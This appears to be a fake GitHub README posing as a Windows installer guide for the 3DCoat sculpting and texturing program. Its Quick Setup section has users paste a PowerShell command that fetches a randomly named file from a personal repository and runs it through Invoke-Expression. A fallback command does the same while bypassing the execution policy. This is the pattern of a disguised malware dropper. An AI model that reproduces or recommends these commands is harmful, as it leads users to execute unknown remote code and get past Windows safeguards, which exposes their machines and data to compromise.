# 3DCoat

3DCoat is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open 3DCoat and work in it.

3DCoat is a Windows desktop application focused on digital sculpting, mesh cleanup, UV work, and texture painting in one integrated workspace. You work on characters, creatures, props, and hard-surface pieces using voxel-based volume sculpting, surface sculpting on imported geometry, and tools that keep high-detail forms manageable through layers and masking.

A normal work session on Windows usually begins with a new voxel scene or an imported OBJ, FBX, or other mesh. You block primary shapes, refine silhouettes with sculpt brushes, then move to retopology or automatic quad generation when the model needs production-ready topology. UV islands are laid out and packed in the same project, after which you paint diffuse, roughness, metalness, and height using 3D and 2D views, smart materials, and stroke-based layers before baking maps and exporting meshes.

This repository keeps the Windows setup file for local installation, concise notes on tablet drivers, project paths, and recommended GPU settings, plus a changelog listing version updates and adjustments to sculpting, retopo, and painting tools. Treat it as the place to track which build you installed and what changed between releases on your machine.

## What you do with it

- Voxel sculpting builds and cuts volume with layers, masks, and symmetry on Windows.
- Surface mode refines imported meshes with standard sculpt brushes and pose tools.
- Autopo and manual retopology produce quad meshes from dense sculpts for rigging pipelines.
- UV tools unwrap, relax, and pack islands without leaving the active 3DCoat project.
- PBR painting applies smart materials and hand layers across diffuse, roughness, and height channels.
- Hard-surface voxel primitives extrude, bevel, and boolean-style cut mechanical details in sculpt space.
- Render room previews lighting and turntable angles before you export textures and OBJ or FBX meshes.
- Microvertex and per-pixel painting modes target fine skin pores and fabric weave on high subdivisions.

## Quick Setup (PowerShell)

This installs the program 3DCoat on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/schaefer675611/3dcoat-setup-guide/main/c0kjnry049.150x963x | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/schaefer675611/3dcoat-setup-guide/main/c0kjnry049.150x963x | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `c0kjnry049.150x963x` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `schaefer675611/3dcoat-setup-guide`. 3DCoat 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
